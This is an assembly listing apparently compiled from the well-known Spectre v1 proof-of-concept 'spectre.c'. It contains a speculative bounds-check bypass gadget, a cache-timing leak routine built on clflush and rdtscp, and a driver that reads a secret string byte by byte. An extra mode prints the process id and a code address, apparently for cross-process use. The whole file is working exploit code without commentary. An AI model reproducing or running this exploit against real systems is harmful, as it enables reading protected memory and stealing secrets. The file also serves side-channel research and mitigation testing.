	.text
	.file	"spectre.c"
	.globl	check                   # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:                                # %entry
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -16(%rbp)
	movq	-16(%rbp), %rdi
	movl	array1_size, %eax
	movslq	%eax, %rcx
	cmpq	%rcx, %rdi
	jae	.LBB0_2
# %bb.1:                                # %if.then
	movl	$1, -4(%rbp)
	jmp	.LBB0_3
.LBB0_2:                                # %if.end
	movl	$0, -4(%rbp)
.LBB0_3:                                # %return
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function         # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:                                # %entry
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdi
	movl	array1_size, %eax
	movslq	%eax, %rcx
	cmpq	%rcx, %rdi
	jae	.LBB1_2
# %bb.1:                                # %if.then
	movq	-8(%rbp), %rax
	movzbl	array1(,%rax), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rax
	movzbl	array2(,%rax), %ecx
	movzbl	temp, %edx
	andl	%ecx, %edx
	movb	%dl, %sil
	movb	%sil, temp
.LBB1_2:                                # %if.end
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte          # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:                                # %entry
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movl	$0, -64(%rbp)
	movl	$0, -48(%rbp)
.LBB2_1:                                # %for.cond
                                        # =>This Inner Loop Header: Depth=1
	cmpl	$256, -48(%rbp)         # imm = 0x100
	jge	.LBB2_4
# %bb.2:                                # %for.body
                                        #   in Loop: Header=BB2_1 Depth=1
	movslq	-48(%rbp), %rax
	movl	$0, readMemoryByte.results(,%rax,4)
# %bb.3:                                # %for.inc
                                        #   in Loop: Header=BB2_1 Depth=1
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_1
.LBB2_4:                                # %for.end
	movl	$999, -44(%rbp)         # imm = 0x3E7
.LBB2_5:                                # %for.cond1
                                        # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_19 Depth 2
                                        #     Child Loop BB2_26 Depth 2
	cmpl	$0, -44(%rbp)
	jle	.LBB2_42
# %bb.6:                                # %for.body3
                                        #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_7:                                # %for.cond4
                                        #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         # imm = 0x100
	jge	.LBB2_10
# %bb.8:                                # %for.body6
                                        #   in Loop: Header=BB2_7 Depth=2
	movabsq	$array2, %rax
	movl	-48(%rbp), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rdx
	addq	%rdx, %rax
	clflush	(%rax)
# %bb.9:                                # %for.inc9
                                        #   in Loop: Header=BB2_7 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_7
.LBB2_10:                               # %for.end11
                                        #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	movl	array1_size, %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rsi
	movq	%rsi, -72(%rbp)
	movl	$29, -52(%rbp)
.LBB2_11:                               # %for.cond12
                                        #   Parent Loop BB2_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	cmpl	$0, -52(%rbp)
	jl	.LBB2_18
# %bb.12:                               # %for.body15
                                        #   in Loop: Header=BB2_11 Depth=2
	clflush	array1_size(%rip)
	movl	$0, -108(%rbp)
.LBB2_13:                               # %for.cond16
                                        #   Parent Loop BB2_5 Depth=1
                                        #     Parent Loop BB2_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	-108(%rbp), %eax
	cmpl	$100, %eax
	jge	.LBB2_16
# %bb.14:                               # %for.body19
                                        #   in Loop: Header=BB2_13 Depth=3
	jmp	.LBB2_15
.LBB2_15:                               # %for.inc20
                                        #   in Loop: Header=BB2_13 Depth=3
	movl	-108(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -108(%rbp)
	jmp	.LBB2_13
.LBB2_16:                               # %for.end22
                                        #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	cltd
	movl	$6, %ecx
	idivl	%ecx
	subl	$1, %edx
	andl	$-65536, %edx           # imm = 0xFFFF0000
	movslq	%edx, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rsi
	movq	-80(%rbp), %rdi
	shrq	$16, %rdi
	orq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-72(%rbp), %rsi
	movq	-80(%rbp), %rdi
	movq	-24(%rbp), %r8
	xorq	-72(%rbp), %r8
	andq	%r8, %rdi
	xorq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rdi
	callq	victim_function
# %bb.17:                               # %for.inc27
                                        #   in Loop: Header=BB2_11 Depth=2
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB2_11
.LBB2_18:                               # %for.end28
                                        #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -48(%rbp)
.LBB2_19:                               # %for.cond29
                                        #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         # imm = 0x100
	jge	.LBB2_25
# %bb.20:                               # %for.body32
                                        #   in Loop: Header=BB2_19 Depth=2
	movabsq	$array2, %rax
	imull	$167, -48(%rbp), %ecx
	addl	$13, %ecx
	andl	$255, %ecx
	movl	%ecx, -60(%rbp)
	movl	-60(%rbp), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rdx
	addq	%rdx, %rax
	movq	%rax, -104(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rdx
	movq	%rax, -120(%rbp)        # 8-byte Spill
	movq	%rdx, -128(%rbp)        # 8-byte Spill
	rdtscp
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	-128(%rbp), %rdx        # 8-byte Reload
	movl	%ecx, (%rdx)
	movq	%rax, -88(%rbp)
	movq	-104(%rbp), %rax
	movb	(%rax), %sil
	movzbl	%sil, %ecx
	movl	%ecx, -64(%rbp)
	movq	-120(%rbp), %rax        # 8-byte Reload
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rdi
	rdtscp
	shlq	$32, %rdx
	orq	%rdx, %rax
	movl	%ecx, (%rdi)
	subq	-88(%rbp), %rax
	movq	%rax, -96(%rbp)
	cmpq	$50, -96(%rbp)
	ja	.LBB2_23
# %bb.21:                               # %land.lhs.true
                                        #   in Loop: Header=BB2_19 Depth=2
	movl	-60(%rbp), %eax
	movl	-44(%rbp), %ecx
	movl	array1_size, %edx
	movl	%eax, -132(%rbp)        # 4-byte Spill
	movl	%ecx, %eax
	movl	%edx, -136(%rbp)        # 4-byte Spill
	cltd
	movl	-136(%rbp), %ecx        # 4-byte Reload
	idivl	%ecx
	movslq	%edx, %rsi
	movzbl	array1(,%rsi), %edx
	movl	-132(%rbp), %edi        # 4-byte Reload
	cmpl	%edx, %edi
	je	.LBB2_23
# %bb.22:                               # %if.then
                                        #   in Loop: Header=BB2_19 Depth=2
	movslq	-60(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, readMemoryByte.results(,%rax,4)
.LBB2_23:                               # %if.end
                                        #   in Loop: Header=BB2_19 Depth=2
	jmp	.LBB2_24
.LBB2_24:                               # %for.inc52
                                        #   in Loop: Header=BB2_19 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_19
.LBB2_25:                               # %for.end54
                                        #   in Loop: Header=BB2_5 Depth=1
	movl	$-1, -56(%rbp)
	movl	$-1, -52(%rbp)
	movl	$0, -48(%rbp)
.LBB2_26:                               # %for.cond55
                                        #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)         # imm = 0x100
	jge	.LBB2_36
# %bb.27:                               # %for.body58
                                        #   in Loop: Header=BB2_26 Depth=2
	cmpl	$0, -52(%rbp)
	jl	.LBB2_29
# %bb.28:                               # %lor.lhs.false
                                        #   in Loop: Header=BB2_26 Depth=2
	movslq	-48(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-52(%rbp), %rax
	cmpl	readMemoryByte.results(,%rax,4), %ecx
	jl	.LBB2_30
.LBB2_29:                               # %if.then67
                                        #   in Loop: Header=BB2_26 Depth=2
	movl	-52(%rbp), %eax
	movl	%eax, -56(%rbp)
	movl	-48(%rbp), %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB2_34
.LBB2_30:                               # %if.else
                                        #   in Loop: Header=BB2_26 Depth=2
	cmpl	$0, -56(%rbp)
	jl	.LBB2_32
# %bb.31:                               # %lor.lhs.false70
                                        #   in Loop: Header=BB2_26 Depth=2
	movslq	-48(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-56(%rbp), %rax
	cmpl	readMemoryByte.results(,%rax,4), %ecx
	jl	.LBB2_33
.LBB2_32:                               # %if.then77
                                        #   in Loop: Header=BB2_26 Depth=2
	movl	-48(%rbp), %eax
	movl	%eax, -56(%rbp)
.LBB2_33:                               # %if.end78
                                        #   in Loop: Header=BB2_26 Depth=2
	jmp	.LBB2_34
.LBB2_34:                               # %if.end79
                                        #   in Loop: Header=BB2_26 Depth=2
	jmp	.LBB2_35
.LBB2_35:                               # %for.inc80
                                        #   in Loop: Header=BB2_26 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB2_26
.LBB2_36:                               # %for.end82
                                        #   in Loop: Header=BB2_5 Depth=1
	movslq	-52(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-56(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %edx
	shll	$1, %edx
	addl	$5, %edx
	cmpl	%edx, %ecx
	jge	.LBB2_39
# %bb.37:                               # %lor.lhs.false91
                                        #   in Loop: Header=BB2_5 Depth=1
	movslq	-52(%rbp), %rax
	cmpl	$2, readMemoryByte.results(,%rax,4)
	jne	.LBB2_40
# %bb.38:                               # %land.lhs.true96
                                        #   in Loop: Header=BB2_5 Depth=1
	movslq	-56(%rbp), %rax
	cmpl	$0, readMemoryByte.results(,%rax,4)
	jne	.LBB2_40
.LBB2_39:                               # %if.then101
	jmp	.LBB2_42
.LBB2_40:                               # %if.end102
                                        #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_41
.LBB2_41:                               # %for.inc103
                                        #   in Loop: Header=BB2_5 Depth=1
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	jmp	.LBB2_5
.LBB2_42:                               # %for.end105
	movl	-64(%rbp), %eax
	xorl	readMemoryByte.results, %eax
	movl	%eax, readMemoryByte.results
	movl	-52(%rbp), %eax
	movb	%al, %cl
	movq	-32(%rbp), %rdx
	movb	%cl, (%rdx)
	movslq	-52(%rbp), %rdx
	movl	readMemoryByte.results(,%rdx,4), %eax
	movq	-40(%rbp), %rdx
	movl	%eax, (%rdx)
	movl	-56(%rbp), %eax
	movb	%al, %cl
	movq	-32(%rbp), %rdx
	movb	%cl, 1(%rdx)
	movslq	-56(%rbp), %rdx
	movl	readMemoryByte.results(,%rdx,4), %eax
	movq	-40(%rbp), %rdx
	movl	%eax, 4(%rdx)
	addq	$144, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                    # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:                                # %entry
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$128, %rsp
	movl	$0, -4(%rbp)
	movl	%edi, -8(%rbp)
	movq	%rsi, -16(%rbp)
.LBB3_1:                                # %while.body
                                        # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
	callq	getchar
	movb	%al, %cl
	movb	%cl, -17(%rbp)
	movsbl	-17(%rbp), %eax
	cmpl	$114, %eax
	jne	.LBB3_22
# %bb.2:                                # %if.then
                                        #   in Loop: Header=BB3_1 Depth=1
	movq	secret, %rsi
	movq	secret, %rdx
	movabsq	$.L.str.1, %rdi
	movb	$0, %al
	callq	printf
	movq	secret, %rdx
	movabsq	$array1, %rsi
	subq	%rsi, %rdx
	movq	%rdx, -32(%rbp)
	movq	secret, %rdi
	movl	%eax, -60(%rbp)         # 4-byte Spill
	callq	strlen
	movl	%eax, %ecx
	movl	%ecx, -44(%rbp)
	movq	$0, -56(%rbp)
.LBB3_3:                                # %for.cond
                                        #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpq	$131072, -56(%rbp)      # imm = 0x20000
	jae	.LBB3_6
# %bb.4:                                # %for.body
                                        #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rax
	movb	$1, array2(,%rax)
# %bb.5:                                # %for.inc
                                        #   in Loop: Header=BB3_3 Depth=2
	movq	-56(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -56(%rbp)
	jmp	.LBB3_3
.LBB3_6:                                # %for.end
                                        #   in Loop: Header=BB3_1 Depth=1
	cmpl	$3, -8(%rbp)
	jne	.LBB3_8
# %bb.7:                                # %if.then10
                                        #   in Loop: Header=BB3_1 Depth=1
	movq	-16(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	-32(%rbp), %rax
	movabsq	$.L.str.2, %rsi
	movq	%rax, %rdx
	movb	$0, %al
	callq	__isoc99_sscanf
	movq	-32(%rbp), %rdx
	movabsq	$array1, %rsi
	subq	%rsi, %rdx
	movq	%rdx, -32(%rbp)
	movq	-16(%rbp), %rdx
	movq	16(%rdx), %rdi
	movabsq	$.L.str.3, %rsi
	leaq	-44(%rbp), %rdx
	movl	%eax, -64(%rbp)         # 4-byte Spill
	movb	$0, %al
	callq	__isoc99_sscanf
	movq	-32(%rbp), %rsi
	movl	-44(%rbp), %edx
	movabsq	$.L.str.4, %rdi
	movl	%eax, -68(%rbp)         # 4-byte Spill
	movb	$0, %al
	callq	printf
	movl	%eax, -72(%rbp)         # 4-byte Spill
.LBB3_8:                                # %if.end
                                        #   in Loop: Header=BB3_1 Depth=1
	movl	-44(%rbp), %esi
	movabsq	$.L.str.5, %rdi
	movb	$0, %al
	callq	printf
	movl	%eax, -76(%rbp)         # 4-byte Spill
.LBB3_9:                                # %while.cond17
                                        #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	cmpl	$0, %eax
	jl	.LBB3_21
# %bb.10:                               # %while.body20
                                        #   in Loop: Header=BB3_9 Depth=2
	movq	-32(%rbp), %rsi
	movabsq	$.L.str.6, %rdi
	movb	$0, %al
	callq	printf
	leaq	-40(%rbp), %rdx
	leaq	-46(%rbp), %rsi
	movq	-32(%rbp), %rdi
	movq	%rdi, %rcx
	addq	$1, %rcx
	movq	%rcx, -32(%rbp)
	movl	%eax, -80(%rbp)         # 4-byte Spill
	callq	readMemoryByte
	movl	-40(%rbp), %eax
	movl	-36(%rbp), %r8d
	shll	$1, %r8d
	cmpl	%r8d, %eax
	movabsq	$.L.str.8, %rcx
	movabsq	$.L.str.9, %rdx
	cmovgeq	%rcx, %rdx
	movabsq	$.L.str.7, %rdi
	movq	%rdx, %rsi
	movb	$0, %al
	callq	printf
	movzbl	-46(%rbp), %esi
	movzbl	-46(%rbp), %r8d
	cmpl	$31, %r8d
	movl	%eax, -84(%rbp)         # 4-byte Spill
	movl	%esi, -88(%rbp)         # 4-byte Spill
	jle	.LBB3_13
# %bb.11:                               # %land.lhs.true
                                        #   in Loop: Header=BB3_9 Depth=2
	movzbl	-46(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB3_13
# %bb.12:                               # %cond.true
                                        #   in Loop: Header=BB3_9 Depth=2
	movzbl	-46(%rbp), %eax
	movl	%eax, -92(%rbp)         # 4-byte Spill
	jmp	.LBB3_14
.LBB3_13:                               # %cond.false
                                        #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -92(%rbp)         # 4-byte Spill
	jmp	.LBB3_14
.LBB3_14:                               # %cond.end
                                        #   in Loop: Header=BB3_9 Depth=2
	movl	-92(%rbp), %eax         # 4-byte Reload
	movl	-40(%rbp), %ecx
	movabsq	$.L.str.10, %rdi
	movl	-88(%rbp), %esi         # 4-byte Reload
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
	cmpl	$0, -36(%rbp)
	movl	%eax, -96(%rbp)         # 4-byte Spill
	jle	.LBB3_20
# %bb.15:                               # %if.then47
                                        #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %esi
	movzbl	-45(%rbp), %eax
	cmpl	$31, %eax
	movl	%esi, -100(%rbp)        # 4-byte Spill
	jle	.LBB3_18
# %bb.16:                               # %land.lhs.true54
                                        #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB3_18
# %bb.17:                               # %cond.true59
                                        #   in Loop: Header=BB3_9 Depth=2
	movzbl	-45(%rbp), %eax
	movl	%eax, -104(%rbp)        # 4-byte Spill
	jmp	.LBB3_19
.LBB3_18:                               # %cond.false62
                                        #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -104(%rbp)        # 4-byte Spill
	jmp	.LBB3_19
.LBB3_19:                               # %cond.end63
                                        #   in Loop: Header=BB3_9 Depth=2
	movl	-104(%rbp), %eax        # 4-byte Reload
	movl	-36(%rbp), %ecx
	movabsq	$.L.str.11, %rdi
	movl	-100(%rbp), %esi        # 4-byte Reload
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
	movl	%eax, -108(%rbp)        # 4-byte Spill
.LBB3_20:                               # %if.end67
                                        #   in Loop: Header=BB3_9 Depth=2
	movabsq	$.L.str.12, %rdi
	movb	$0, %al
	callq	printf
	movl	%eax, -112(%rbp)        # 4-byte Spill
	jmp	.LBB3_9
.LBB3_21:                               # %while.end
                                        #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_22:                               # %if.else
                                        #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$10, %eax
	jne	.LBB3_24
# %bb.23:                               # %if.then72
                                        #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_24:                               # %if.else73
                                        #   in Loop: Header=BB3_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$105, %eax
	jne	.LBB3_26
# %bb.25:                               # %if.then77
                                        #   in Loop: Header=BB3_1 Depth=1
	movb	$0, %al
	callq	getpid
	movabsq	$check, %rcx
	addq	$33, %rcx
	movabsq	$.L.str.13, %rdi
	movq	%rcx, %rsi
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
	movl	%eax, -116(%rbp)        # 4-byte Spill
	jmp	.LBB3_27
.LBB3_26:                               # %if.else80
	jmp	.LBB3_30
.LBB3_27:                               # %if.end81
                                        #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_28
.LBB3_28:                               # %if.end82
                                        #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_29:                               # %if.end83
                                        #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_30:                               # %while.end84
	xorl	%eax, %eax
	addq	$128, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object     # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                      # 0x10
	.size	array1_size, 4

	.type	array1,@object          # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	array2,@object          # @array2
	.globl	array2
	.p2align	4
array2:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131056
	.size	array2, 131072

	.type	.L.str,@object          # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object          # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object            # @temp
	.bss
	.globl	temp
temp:
	.byte	0                       # 0x0
	.size	temp, 1

	.type	readMemoryByte.results,@object # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object        # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object        # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object        # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object        # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object        # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object        # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p... "
	.size	.L.str.6, 32

	.type	.L.str.7,@object        # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object        # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object        # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object       # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object       # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.12,@object       # @.str.12
.L.str.12:
	.asciz	"\n"
	.size	.L.str.12, 2

	.type	.L.str.13,@object       # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object         # @unused1
	.comm	unused1,64,16
	.type	unused2,@object         # @unused2
	.comm	unused2,64,16

	.ident	"clang version 8.0.0 (tags/RELEASE_800/final)"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym readMemoryByte.results